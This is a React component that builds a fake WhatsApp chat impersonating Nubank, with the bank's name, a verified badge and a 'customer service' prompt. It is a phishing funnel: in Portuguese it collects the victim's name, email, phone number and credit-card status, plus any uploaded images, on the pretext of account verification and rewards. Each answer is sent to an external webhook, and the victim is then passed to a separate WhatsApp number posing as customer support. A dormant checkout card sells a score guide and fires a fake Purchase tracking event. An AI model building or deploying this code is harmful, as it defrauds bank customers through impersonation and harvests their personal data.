"use client";

import React from "react"

import { useState, useEffect, useRef, useCallback } from "react";
import {
  ArrowLeft,
  Video,
  Phone,
  MoreVertical,
  Smile,
  Paperclip,
  Camera,
  Mic,
  Send,
  Check,
  CheckCheck,
  Pause,
  Play,
} from "lucide-react";

interface Message {
  id: string;
  type: "text" | "audio" | "options" | "link";
  content: string;
  sender: "bot" | "user";
  timestamp: string;
  options?: string[];
  audioUrl?: string;
  linkUrl?: string;
  linkText?: string;
}

interface WhatsAppChatProps {
  onFunnelComplete: (data: Record<string, unknown>) => void;
}

// Funnel flow configuration - controlled responses
const FUNNEL_FLOW: {
  step: number;
  message: string;
  type: "text" | "audio" | "options" | "link";
  options?: string[];
  audioUrl?: string;
  linkUrl?: string;
  linkText?: string;
  delay: number;
  nextStep?: Record<string, number>;
}[] = [
    {
      step: 0,
      message: "Olá, para continuarmos precisamos verificar somente seu cadastro 💜",
      type: "text",
      delay: 1000,
    },
    {
      step: 1,
      message: "Para começar informe somente, qual o seu nome? ",
      type: "text",
      delay: 1500,
    },
    {
      step: 19,
      message: "Agora confirme somente o NÚMERO e o E-MAIL cadastrado à conta (NÃO É NECESSÁRIO INFORMAR A SENHA)\n`Envie primeiro o e-mail, depois o número`",
      type: "text",
      delay: 1200,
    },
    {
      step: 20,
      message: "e como última validação, para RESGATE DE SEUS PONTOS/BENEFÍCIOS, só nos CONFIRME SE POSSUI CARTÃO DE CRÉDITO cadastrado conosco:",
      type: "options",
      options: ["SIM", "NÃO"],
      delay: 1200,
      nextStep: { "SIM": 21, "NÃO": 21 },
    },
    {
      step: 21,
      message: "Agradeço a resposta, clique no botão abaixo para agilizar o contato com nosso SAC",
      type: "link",
      linkUrl: "https://wa.me/1930916670",
      linkText: "FALAR COM O SAC",
      delay: 1500,
    }
  ];

export function WhatsAppChat({ onFunnelComplete }: WhatsAppChatProps) {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState(0);
  const [isTyping, setIsTyping] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [waitingForEmail, setWaitingForEmail] = useState(false);
  const [waitingForPhone, setWaitingForPhone] = useState(false);
  const [waitingForName, setWaitingForName] = useState(false);
  const [showCheckoutCard, setShowCheckoutCard] = useState(false);
  const [funnelData, setFunnelData] = useState<Record<string, unknown>>({});
  const funnelDataRef = useRef<Record<string, unknown>>({});
  const [isPlayingAudio, setIsPlayingAudio] = useState(false);
  const [audioProgress, setAudioProgress] = useState(0);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const initiatedRef = useRef(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isTyping]);

  const addBotMessage = useCallback(
    (
      content: string,
      type: "text" | "audio" | "options" | "link" = "text",
      options?: string[],
      audioUrl?: string,
      linkUrl?: string,
      linkText?: string
    ) => {
      const newMessage: Message = {
        id: Math.random().toString(36).substring(7),
        type,
        content,
        sender: "bot",
        timestamp: new Date().toLocaleTimeString("pt-BR", {
          hour: "2-digit",
          minute: "2-digit",
        }),
        options,
        audioUrl,
        linkUrl,
        linkText,
      };
      setMessages((prev) => [...prev, newMessage]);
    },
    []
  );

  // Capture UTM parameters and URL info
  const [sessionInfo, setSessionInfo] = useState<Record<string, string>>({});

  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const utms: Record<string, string> = {};
      params.forEach((value, key) => {
        if (key.startsWith("utm_")) {
          utms[key] = value;
        }
      });
      setSessionInfo({
        ...utms,
        url: window.location.href,
        referrer: document.referrer,
      });
    }
  }, []);

  const finalizeFunnel = useCallback(async () => {
    console.log("[v0] CRITICAL: Dispatching final lead data...");

    const finalFields = {
      completedAt: new Date().toISOString(),
      funnel_status: "terminated_at_card_question"
    };

    const updatedData = { ...funnelDataRef.current, ...finalFields };
    funnelDataRef.current = updatedData;
    setFunnelData(updatedData);

    try {
      await sendToWebhook({
        event: "lead_conversion",
        event_name: "funnel_completed",
        is_final_conversion: true,
        ...updatedData,
      });
      console.log("[v0] FINAL CONVERSION DATA SENT SUCCESSFULLY");
    } catch (error) {
      console.error("[v0] CRITICAL ERROR IN FINAL WEBHOOK:", error);
    }

    // We don't necessarily call onFunnelComplete(updatedData) here 
    // because we want to stay on the chat with the SAC button
  }, [sessionInfo]);

  const processStep = useCallback(
    (step: number) => {
      const flowItem = FUNNEL_FLOW.find((f) => f.step === step);
      if (!flowItem) return;

      // Update current step to match the message being sent/answered
      setCurrentStep(step);
      setIsTyping(true);

      setTimeout(() => {
        setIsTyping(false);
        addBotMessage(
          flowItem.message.replace("{name}", (funnelDataRef.current.name as string) || "amigo"),
          flowItem.type,
          flowItem.options,
          flowItem.audioUrl,
          flowItem.linkUrl,
          flowItem.linkText
        );

        // Check if step 0 (initial welcome) - auto advance to name question
        if (step === 0) {
          setTimeout(() => processStep(1), 500);
        }

        // Check if step 1 (name question)
        if (step === 1) {
          setWaitingForName(true);
        }

        // Check if step 13 or 19 - wait for Email
        if (step === 13 || step === 19) {
          setWaitingForEmail(true);
        }

        // Trigger Pixel events when showing payment card
        if (step === 16) {
          setShowCheckoutCard(true);
          firePixelEvent('InitiateCheckout');
          firePixelEvent('Purchase', {
            value: 67.00,
            currency: 'BRL'
          });

          // Also send final "ready for checkout" webhook
          sendToWebhook({
            event: "initiate_checkout",
            ...funnelDataRef.current
          });
        }
      }, flowItem.delay);
    },
    [addBotMessage, setWaitingForEmail]
  );

  // Start the conversation
  useEffect(() => {
    if (!initiatedRef.current) {
      processStep(0);
      initiatedRef.current = true;
    }
  }, [processStep]);

  const firePixelEvent = useCallback((event: string, params?: any) => {
    if (typeof window !== "undefined" && (window as any).fbq) {
      console.log(`[v0] [Pixel] Firing ${event}`, params);
      (window as any).fbq('track', event, params);
    } else {
      console.warn(`[v0] [Pixel] fbq not found while firing ${event}`);
      // If not yet available, we can try to fire PageView as a fallback or queue it
    }
  }, []);

  const sendToWebhook = async (data: Record<string, unknown>) => {
    // URL de Producao para o n8n
    const webhookUrl = "https://wbn.araxa.app/webhook/fluxo";
    const payload = {
      ...data,
      ...sessionInfo,
      timestamp: new Date().toISOString(),
    };

    const payloadString = JSON.stringify(payload);
    const payloadSize = new Blob([payloadString]).size;

    console.log(`[v0] Sending webhook [${data.event}]... Size: ${payloadSize} bytes.`);
    console.log(`[v0] Payload Fields:`, Object.keys(payload).filter(k => k !== 'image_data'), (payload as any).image_data ? "(+ image_data)" : "");

    try {
      const response = await fetch(webhookUrl, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: payloadString,
      });
      console.log(`[v0] Webhook [${data.event}] sent successfully`);
      return response;
    } catch (error) {
      console.error("[v0] Error sending webhook:", error);
      throw error;
    }
  };

  const handleOptionSelect = (option: string) => {
    // Add user message
    const userMessage: Message = {
      id: Date.now().toString(),
      type: "text",
      content: option,
      sender: "user",
      timestamp: new Date().toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      }),
    };
    setMessages((prev) => [...prev, userMessage]);

    // Update funnel data - source of truth is the Ref
    const newData = {
      [`step_${currentStep}`]: option,
    };
    funnelDataRef.current = { ...funnelDataRef.current, ...newData };
    setFunnelData(funnelDataRef.current);

    // Reset waiting states when selecting an option to avoid overlapping input handlers
    setWaitingForName(false);
    setWaitingForEmail(false);
    setWaitingForPhone(false);
    setInputValue("");

    // Find next step
    const flowItem = FUNNEL_FLOW.find((f) => f.step === currentStep);
    if (flowItem?.nextStep) {
      const nextStep = flowItem.nextStep[option];
      if (nextStep === -1) {
        // User declined
        addBotMessage(
          "Sem problemas! Quando quiser continuar, e so me chamar. Ate mais!",
          "text"
        );
        return;
      }
      processStep(nextStep);

      // If we just moved to step 21, it's the end of the funnel
      if (nextStep === 21) {
        finalizeFunnel();
      }
    }
  };

  const handleNameSubmit = () => {
    if (!inputValue.trim()) return;

    const name = inputValue.trim();

    // Add user message
    const userMessage: Message = {
      id: Date.now().toString(),
      type: "text",
      content: name,
      sender: "user",
      timestamp: new Date().toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      }),
    };
    setMessages((prev) => [...prev, userMessage]);
    setInputValue("");
    setWaitingForName(false);

    // Update funnel data
    funnelDataRef.current = { ...funnelDataRef.current, name };
    setFunnelData(funnelDataRef.current);

    // Send incremental webhook
    sendToWebhook({
      event: "name_captured",
      name
    });

    // Advance to Step 19 (Email)
    setTimeout(() => {
      processStep(19);
    }, 1000);
  };

  const handleEmailSubmit = () => {
    if (!inputValue.trim()) return;

    const email = inputValue.trim();

    // Add user message
    const userMessage: Message = {
      id: Date.now().toString(),
      type: "text",
      content: email,
      sender: "user",
      timestamp: new Date().toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      }),
    };
    setMessages((prev) => [...prev, userMessage]);
    setInputValue("");
    setWaitingForEmail(false);

    // Update funnel data - saving to state and Ref
    const newData = { email };
    funnelDataRef.current = { ...funnelDataRef.current, ...newData };
    setFunnelData(funnelDataRef.current);

    // Send incremental webhook
    sendToWebhook({
      event: "email_captured",
      ...funnelDataRef.current
    });

    // Instead of advancing to Step 20, wait for phone
    setWaitingForPhone(true);
  };

  const handlePhoneSubmit = () => {
    if (!inputValue.trim()) return;

    const phone = inputValue.trim();

    // Add user message
    const userMessage: Message = {
      id: Date.now().toString(),
      type: "text",
      content: phone,
      sender: "user",
      timestamp: new Date().toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      }),
    };
    setMessages((prev) => [...prev, userMessage]);
    setInputValue("");
    setWaitingForPhone(false);

    // Update funnel data
    const newData = { phone };
    funnelDataRef.current = { ...funnelDataRef.current, ...newData };
    setFunnelData(funnelDataRef.current);

    // Send incremental webhook
    sendToWebhook({
      event: "phone_captured",
      ...funnelDataRef.current
    });

    // Advance to next step (Credit Card question)
    setTimeout(() => {
      processStep(20);
    }, 1200);
  };

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 11);
    if (numbers.length <= 10) {
      return numbers
        .replace(/(\d{2})(\d)/, "($1) $2")
        .replace(/(\d{4})(\d)/, "$1-$2");
    }
    return numbers
      .replace(/(\d{2})(\d)/, "($1) $2")
      .replace(/(\d{5})(\d)/, "$1-$2");
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (waitingForPhone) {
      setInputValue(formatPhone(value));
    } else {
      setInputValue(value);
    }
  };

  const toggleAudio = (audioUrl: string) => {
    if (audioRef.current) {
      if (isPlayingAudio) {
        audioRef.current.pause();
        setIsPlayingAudio(false);
      } else {
        audioRef.current.play();
        setIsPlayingAudio(true);
      }
    } else {
      const audio = new Audio(audioUrl);
      audioRef.current = audio;
      audio.play();
      setIsPlayingAudio(true);

      audio.ontimeupdate = () => {
        setAudioProgress((audio.currentTime / audio.duration) * 100);
      };

      audio.onended = () => {
        setIsPlayingAudio(false);
        setAudioProgress(0);
      };
    }
  };

  const handleImageClick = () => {
    fileInputRef.current?.click();
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    // Add user message
    const userMessage: Message = {
      id: Math.random().toString(36).substring(7),
      type: "text",
      content: "📷 [Imagem enviada]",
      sender: "user",
      timestamp: new Date().toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      }),
    };
    setMessages((prev) => [...prev, userMessage]);

    // Send to webhook with full current data
    const reader = new FileReader();
    reader.onloadend = () => {
      const imageData = reader.result;

      // Update funnel data to include image for subsequent steps
      const imageFields = {
        image_data: imageData,
        image_name: file.name
      };
      funnelDataRef.current = { ...funnelDataRef.current, ...imageFields };
      setFunnelData(funnelDataRef.current);
    };
    reader.readAsDataURL(file);

    // Advance to email step after image
    setTimeout(() => processStep(13), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#0b141a] flex flex-col">
      <input
        type="file"
        ref={fileInputRef}
        onChange={handleImageUpload}
        accept="image/*"
        className="hidden"
      />
      {/* WhatsApp Header */}
      <header className="bg-[#1f2c34] px-2 py-2 flex items-center gap-2 flex-shrink-0">
        <button className="p-2 text-white/80">
          <ArrowLeft className="w-5 h-5" />
        </button>

        <div className="w-10 h-10 rounded-full overflow-hidden bg-zinc-700">
          <img
            src="/foto-perfil.jpg"
            alt="Nubank"
            className="w-full h-full object-cover"
          />
        </div>

        <div className="flex-1 ml-2">
          <div className="flex items-center gap-1">
            <h1 className="text-white font-medium text-base">Nubank</h1>
            <img src="/simbolo verificado.png" alt="Verified" className="w-3.5 h-3.5 object-contain" />
          </div>
          <p className="text-[#25D366] text-xs">online</p>
        </div>

        <div className="flex items-center gap-4">
          <button className="text-white/80">
            <Video className="w-5 h-5" />
          </button>
          <button className="text-white/80">
            <Phone className="w-5 h-5" />
          </button>
          <button className="text-white/80">
            <MoreVertical className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Chat Background Pattern */}
      <div
        className="flex-1 overflow-y-auto px-3 py-2 bg-cover bg-center bg-no-repeat"
        style={{
          backgroundImage: `url("/Fundo-wpp.webp")`,
        }}
      >
        {/* Date separator */}
        <div className="flex justify-center mb-4">
          <span className="bg-[#1f2c34]/90 text-white/70 text-xs px-3 py-1 rounded-lg">
            Hoje
          </span>
        </div>

        {/* Messages */}
        <div className="space-y-1">
          {messages.map((message) => (
            <div
              key={message.id}
              className={`flex ${message.sender === "user" ? "justify-end" : "justify-start"}`}
            >
              <div
                className={`max-w-[80%] rounded-lg px-3 py-2 ${message.sender === "user"
                  ? "bg-[#005c4b] text-white"
                  : "bg-[#1f2c34] text-white"
                  }`}
              >
                {message.type === "audio" && message.audioUrl ? (
                  <div className="flex items-center gap-3 min-w-[200px]">
                    <button
                      onClick={() => toggleAudio(message.audioUrl!)}
                      className="w-10 h-10 rounded-full bg-[#25D366] flex items-center justify-center flex-shrink-0"
                    >
                      {isPlayingAudio ? (
                        <Pause className="w-5 h-5 text-white" />
                      ) : (
                        <Play className="w-5 h-5 text-white ml-0.5" />
                      )}
                    </button>
                    <div className="flex-1">
                      {/* Waveform */}
                      <div className="flex items-center gap-0.5 h-6">
                        {Array.from({ length: 30 }).map((_, i) => (
                          <div
                            key={i}
                            className={`w-0.5 rounded-full transition-all duration-100 ${i < (audioProgress / 100) * 30
                              ? "bg-[#25D366]"
                              : "bg-white/30"
                              }`}
                            style={{
                              height: `${Math.random() * 100}%`,
                              minHeight: "4px",
                            }}
                          />
                        ))}
                      </div>
                      <div className="flex justify-between text-xs text-white/50 mt-1">
                        <span>0:00</span>
                        <span>{message.timestamp}</span>
                      </div>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="text-sm whitespace-pre-line">
                      {message.content.split(/(\*\*\[.+?\]\(.+?\)\*\*|\[.+?\]\(.+?\)|https?:\/\/[^\s]+|\*[^*]+\*|`[^`]+`)/g).map((part, i) => {
                        const mdLinkMatch = part.match(/\**\[(.+?)\]\((.+?)\)\**/);
                        if (mdLinkMatch) {
                          return (
                            <a
                              key={i}
                              href={mdLinkMatch[2]}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-[#53bdeb] hover:underline font-bold"
                            >
                              {mdLinkMatch[1]}
                            </a>
                          );
                        }
                        const urlMatch = part.match(/(https?:\/\/[^\s]+)/);
                        if (urlMatch) {
                          return (
                            <a
                              key={i}
                              href={urlMatch[1]}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-[#53bdeb] hover:underline"
                            >
                              {urlMatch[1]}
                            </a>
                          );
                        }
                        const boldMatch = part.match(/^\*(.+?)\*$/);
                        if (boldMatch) {
                          return <strong key={i} className="font-bold">{boldMatch[1]}</strong>;
                        }
                        const codeMatch = part.match(/^`(.+?)`$/);
                        if (codeMatch) {
                          return <code key={i} className="font-mono bg-white/5 px-1.5 py-0.5 rounded text-[11px] text-white/80 border border-white/5">{codeMatch[1]}</code>;
                        }
                        return part;
                      })}
                    </div>
                    <div className="flex items-center justify-end gap-1 mt-1">
                      <span className="text-[10px] text-white/50">
                        {message.timestamp}
                      </span>
                      {message.sender === "user" && (
                        <CheckCheck className="w-4 h-4 text-[#53bdeb]" />
                      )}
                    </div>
                  </>
                )}

                {/* Options buttons */}
                {message.type === "options" && message.options && (
                  <div className="mt-3 space-y-2">
                    {message.options.map((option) => (
                      <button
                        key={option}
                        onClick={() => handleOptionSelect(option)}
                        className="w-full py-2.5 px-4 bg-[#0b141a]/50 hover:bg-[#0b141a]/70 text-[#25D366] text-sm font-medium rounded-lg border border-[#25D366]/30 transition-colors"
                      >
                        {option}
                      </button>
                    ))}
                  </div>
                )}

                {/* Link button */}
                {message.type === "link" && message.linkUrl && (
                  <div className="mt-3">
                    <a
                      href={message.linkUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="w-full py-3 px-4 bg-[#25D366] hover:bg-[#20bd5b] text-[#0b141a] font-bold rounded-xl transition-all transform active:scale-[0.98] flex items-center justify-center gap-2"
                    >
                      <svg viewBox="0 0 24 24" className="w-5 h-5" fill="currentColor">
                        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
                      </svg>
                      {message.linkText || "CLIQUE AQUI"}
                    </a>
                  </div>
                )}
              </div>
            </div>
          ))}

          {/* Typing indicator */}
          {isTyping && (
            <div className="flex justify-start">
              <div className="bg-[#1f2c34] rounded-lg px-4 py-3">
                <div className="flex gap-1">
                  <div
                    className="w-2 h-2 bg-white/50 rounded-full animate-bounce"
                    style={{ animationDelay: "0ms" }}
                  />
                  <div
                    className="w-2 h-2 bg-white/50 rounded-full animate-bounce"
                    style={{ animationDelay: "150ms" }}
                  />
                  <div
                    className="w-2 h-2 bg-white/50 rounded-full animate-bounce"
                    style={{ animationDelay: "300ms" }}
                  />
                </div>
              </div>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>

        {/* Native Checkout Card */}
        {showCheckoutCard && (
          <div className="mt-4 px-2 pb-6 animate-in fade-in slide-in-from-bottom-4 duration-1000">
            <div className="bg-[#1f2c34] rounded-2xl overflow-hidden shadow-2xl border border-[#25D366]/20">
              {/* Header */}
              <div className="p-4 bg-[#2a3942] border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="p-1.5 bg-[#25D366]/10 rounded-lg">
                    <svg className="w-5 h-5 text-[#25D366]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  <span className="text-white font-semibold">Pagamento Seguro</span>
                </div>
                <div className="flex">
                  <div className="w-8 h-8 rounded-full bg-white p-1 shadow-sm border border-white/10 ring-2 ring-[#2a3942]">
                    <img src="https://logopng.com.br/logos/pix-106.png" alt="PIX" className="w-full h-full object-contain" />
                  </div>
                </div>
              </div>

              {/* Content */}
              <div className="p-6 space-y-4">
                <div className="space-y-1">
                  <h3 className="text-[#25D366] text-xs font-bold uppercase tracking-wider">Você está adquirindo:</h3>
                  <p className="text-white text-lg font-medium leading-tight">Análise Completa + Guia: Como subir 150 pontos em 1 semana</p>
                </div>

                <div className="flex items-baseline gap-2">
                  <span className="text-white/40 text-sm line-through">R$ 197,00</span>
                  <span className="text-white text-3xl font-bold">R$ 67,00</span>
                  <span className="text-[#25D366] text-[10px] font-bold bg-[#25D366]/10 px-2 py-0.5 rounded uppercase">Oferta Única</span>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center gap-2 text-white/70 text-sm">
                    <Check className="w-4 h-4 text-[#25D366]" />
                    <span>Acesso imediato após o pagamento</span>
                  </div>
                  <div className="flex items-center gap-2 text-white/70 text-sm">
                    <Check className="w-4 h-4 text-[#25D366]" />
                    <span>Consultoria individual garantida</span>
                  </div>
                </div>

                <button
                  onClick={() => window.open('https://mpago.la/2QgNabP', '_blank')}
                  className="w-full py-4 bg-[#25D366] hover:bg-[#20bd5b] text-[#0b141a] font-bold rounded-xl shadow-[0_0_20px_rgba(37,211,102,0.3)] transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 group"
                >
                  <span>PAGAR AGORA NO MERCADO PAGO</span>
                  <svg className="w-5 h-5 transition-transform group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                  </svg>
                </button>
              </div>

              {/* Footer */}
              <div className="p-3 bg-[#2a3942]/50 border-t border-white/5 flex items-center justify-center gap-2">
                <svg className="w-4 h-4 text-white/40" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span className="text-white/40 text-[10px] uppercase tracking-wider font-medium">Transação criptografada pela rede Mercado Pago</span>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Input Area */}
      <div className="bg-[#1f2c34] px-2 py-2 flex items-center gap-2 flex-shrink-0">
        <button className="p-2 text-white/60">
          <Smile className="w-6 h-6" />
        </button>

        <div className="flex-1 flex items-center bg-[#2a3942] rounded-full px-4 py-2">
          <input
            type="text"
            value={inputValue}
            onChange={handleInputChange}
            inputMode={waitingForEmail ? "email" : waitingForPhone ? "tel" : "text"}
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                if (waitingForName) handleNameSubmit();
                if (waitingForEmail) handleEmailSubmit();
                if (waitingForPhone) handlePhoneSubmit();
              }
            }}
            placeholder={
              waitingForName
                ? "Como devo te chamar?"
                : waitingForEmail
                  ? "Digite seu e-mail..."
                  : waitingForPhone
                    ? "Digite seu número..."
                    : "Selecione uma opcao acima"
            }
            disabled={!waitingForEmail && !waitingForName && !waitingForPhone}
            className="flex-1 bg-transparent text-white placeholder-white/40 outline-none text-sm"
          />
          <button
            onClick={handleImageClick}
            className={`p-2 transition-colors ${currentStep === 8 ? "text-[#25D366]" : "text-white/60"}`}
          >
            <Paperclip className="w-5 h-5" />
          </button>
          <button
            onClick={handleImageClick}
            className={`p-2 transition-colors ${currentStep === 8 ? "text-[#25D366]" : "text-white/60"}`}
          >
            <Camera className="w-5 h-5" />
          </button>
        </div>

        {(waitingForEmail || waitingForName || waitingForPhone) && inputValue ? (
          <button
            onClick={
              waitingForName
                ? handleNameSubmit
                : waitingForEmail
                  ? handleEmailSubmit
                  : handlePhoneSubmit
            }
            className="w-12 h-12 rounded-full bg-[#25D366] flex items-center justify-center"
          >
            <Send className="w-5 h-5 text-white" />
          </button>
        ) : (
          <button className="w-12 h-12 rounded-full bg-[#25D366] flex items-center justify-center">
            <Mic className="w-6 h-6 text-white" />
          </button>
        )}
      </div>
    </div>
  );
}
